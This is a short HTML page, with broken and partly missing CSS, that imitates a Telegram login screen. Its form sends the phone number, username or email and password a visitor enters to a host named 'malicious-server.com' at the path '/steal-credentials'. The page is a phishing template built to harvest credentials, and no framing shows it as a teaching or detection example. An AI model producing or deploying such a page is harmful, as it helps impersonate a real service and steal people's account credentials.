<!DOCTYPE html>
<html>
<head>

            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-box {
            background-color: #ffffff;
            padding: 20px;

        .login-box button {
            width: 100%;
            padding: 10px;
            background-color: #0088cc;
            color: #ffffff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Telegram Login</h2>
        <form action="http://malicious-server.com/steal-credentials" method="POST">
            <input type="text" name="username" placeholder="Phone Number, Username or Email">
            <input type="password" name="password" placeholder="Password">
            <button type="submit">Log in</button>
        </form>
    </div>
</body>
</html>
